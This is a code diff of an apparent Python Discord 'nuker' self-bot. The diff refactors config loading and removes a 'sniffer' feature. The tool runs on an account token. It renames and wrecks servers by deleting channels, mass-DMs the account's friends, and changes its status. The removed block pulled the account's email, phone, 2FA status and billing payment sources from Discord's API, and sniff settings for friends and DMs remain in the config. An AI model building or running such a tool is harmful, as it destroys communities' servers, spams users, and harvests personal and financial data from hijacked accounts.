@@ -8,7 +8,7 @@
 #            (_)   (_)                        
 
  
-# Developed by Chasa#0001 
+# Developed by Chasa#0001
 
 # I DO NOT HELD ACCOUNTABLE FOR WHAT YOU DO WITH THIS BOT.
 # SELFBOTTING IS AGAINST DISCORD'S TOS, ONLY USE IT WISLY.
@@ -146,15 +146,15 @@ def getData(data):
 # -----------
 
 print(f"{Fore.CYAN}[>] Loading Config...")
-if True:
-    try:
-        with open('config.json') as f:
-            config = json.load(f)
-        
-        print(f"{Fore.GREEN}[+] Loaded Config!")
-    except Exception as e:
-        print(f"{Fore.RED}[!] Couldn't find config.json. Creating now...")
-        autoConfig = r'''{ 
+global config
+try:
+    with open('config.json') as f:
+        config = json.load(f)
+
+    print(f"{Fore.GREEN}[+] Loaded Config!")
+except Exception as e:
+    print(f"{Fore.RED}[!] Couldn't find config.json. Creating now...")
+    autoConfig = r'''{ 
     "NUKER-SETTINGS": "TO GET HELP GO TO CONFIG SETTINGS",
     "nuker-guilds-change-name" : "nuuked xxxd",
     "nuker-channels-delete" : "true",
@@ -168,7 +168,6 @@ if True:
     "nuker-user-status" : "nukedd-ez",
     "nuker-dm-amount" : "5",
     "nuker-dm-message" : "account nukkedd ezzzz",
-    "nuker-sniffer-enabled" : "true",
     "SNIFFER-SETTINGS" : "TO GET HELP GO TO CONFIG SETTINGS",
     "sniff-personal" : "true",
     "sniff-friends" : "true",
@@ -176,16 +175,17 @@ if True:
     "sniff-find-emails-dms" : "true"
 }'''
 
-        with open("config.json", "w") as f:
-            f.write(autoConfig)
+    with open("config.json", "w") as f:
+        f.write(autoConfig)
         
-        with open('config.json') as f:
-            config = json.load(f)
-        
-        print(f"{Fore.GREEN}[+] Loaded Config!")
+    with open('config.json') as f:
+        config = json.load(f)
+
+    print(f"{Fore.GREEN}[+] Loaded Config!")
 
 def reloadConfig():
     print(f"{Fore.CYAN}[>] Loading Config...")
+    global config
     try:
         with open('config.json') as f:
             config = json.load(f)
@@ -205,6 +205,7 @@ print(f"{Fore.GREEN}[>] Loading Self-Bot...")
 
 @bot.event
 async def on_ready():
+    global config
     while True:
         print(f"""{CLEAR}{Fore.MAGENTA}
                                         _                                  
@@ -225,7 +226,7 @@ async def on_ready():
         reply = input()
         if reply == "1":
             print(CLEAR)
-            try:
+            if True:
                 print(f"""
 [>] Config Loaded:
 -- Guilds --
@@ -246,14 +247,12 @@ async def on_ready():
     - DMs -
         DM Amount: {config["nuker-dm-amount"]}
         DM Message: {config["nuker-dm-message"]}
-    - Sniffer -
-        Enabled: {config["nuker-sniffer-enabled"]}
                 """)        
-            except Exception as e:
-                print(f"{Fore.YELLOW}[-] Invalid Config. Create config again. Press ENTER to Main Menu.")
-                print(e)
-                input()
-            else:
+            #except Exception as e:
+            #    print(f"{Fore.YELLOW}[-] Invalid Config. Create config again. Press ENTER to Main Menu.")
+            #    print(e)
+            #    input()
+            if True:
                 print(f"{Fore.YELLOW}[?] Does everything look ok? (y/n)\n")
                 config_ok = input()
                 if config_ok.lower() == "n":
@@ -308,7 +307,7 @@ async def on_ready():
                             print(f"{Fore.YELLOW}[-] ROLES: No perms in {guild.name}.")
                         # no perms part
                         print("----------------------------")
-                        if config["nuker-no-perms-message"] == "false" or config[nuker-no-perms-message] == "none":
+                        if config["nuker-no-perms-message"] == "false" or config["nuker-no-perms-message"] == "none":
                             print(f"{Fore.YELLOW}[>] NO-PERMS: Skipped No Perms Messaging. (config)")
                         else:
                             for channel in guild.channels:
@@ -318,14 +317,16 @@ async def on_ready():
                                 except:
                                     print(f"{Fore.YELLOW}[-] NO-PERMS: Failed to send message to {channel.name} in {guild.name}.")
 
-
                     # status
                     print("----------------------------")
                     if config["nuker-user-status"] == "none" or config["nuker-user-status"] == "false":
                         print(f"{Fore.YELLOW}[>] Skipped Status. (config)")
                     else:
-                        await bot.change_presence(activity=discord.Game(name=config["nuker-user-status"]))
-                        print(f"{Fore.GREEN}[+] STATUS: Changed Status.")
+                        try:
+                            await bot.change_presence(activity=discord.Game(name=config["nuker-user-status"]))
+                            print(f"{Fore.GREEN}[+] STATUS: Changed Status.")
+                        except:
+                            print(f"{Fore.YELLOW}[-] STATUS: Couldn't change status.")
                     # dms
                     print("----------------------------")
                     if config["nuker-dm-amount"] != "0":
@@ -349,48 +350,9 @@ async def on_ready():
                             print(f"{Fore.YELLOW}[-] DMS: Couldn't get relationships on account.")
                     else:
                         print(f"{Fore.YELLOW}[>] Skipped DMs (config).")
-                    # sniffer
-                    print("----------------------------")
-                    if config["nuker-sniffer-enabled"].lower() == "true":
-                        print(f"{Fore.CYAN}[/] SNIFF: Sniffing User...")
-                        try:
-                            if tokenData["premium_type"] == 1:
-                                nitro = "Nitro Classic"
-                            else:
-                                nitro = "Nitro Boost"
-                        except:
-                            nitro = "None"
-                        headers = { 
-                            "Content-Type": "application/json", 
-                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-                            "Authorization": TOKEN
-                            }
-                        try:
-                            req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
-                            if req.status_code == 200:
-                                paymentData = req.text
-                            else:
-                                paymentData = "None"
 
-                            print(f""" 
-{Fore.GREEN}[+] Sniffed User Data:
-- Username: {tokenData["username"]}#{tokenData["discriminator"]}
-- UserID: {tokenData["id"]}
-- Email: {tokenData["email"]}
-- Nitro Type: {nitro}
-- Phone: {tokenData["phone"]}
-- Secured (verified): {tokenData["verified"]}
-- 2FA: {tokenData["mfa_enabled"]}
-- NSFW: {tokenData["nsfw_allowed"]}
-- Avatar: https://cdn.discordapp.com/avatars/{tokenData["id"]}/{tokenData["avatar"]}.png
-- Billing Info: {paymentData}
- """)
-                            print(f"{Fore.CYAN}[>] Press ENTER to Main Menu.")
-                            input()
-                        except:
-                            print(f"{Fore.YELLOW}[!] SNIFF: Failed to Sniff. (couldn't get info)")
-                    else:
-                        print(f"{Fore.YELLOW}[>] Skipped Sniffer. (config)")
+                    print(f"{Fore.CYAN}[>] Press ENTER to Main Menu.")
+                    input()
         
         
         # elif here
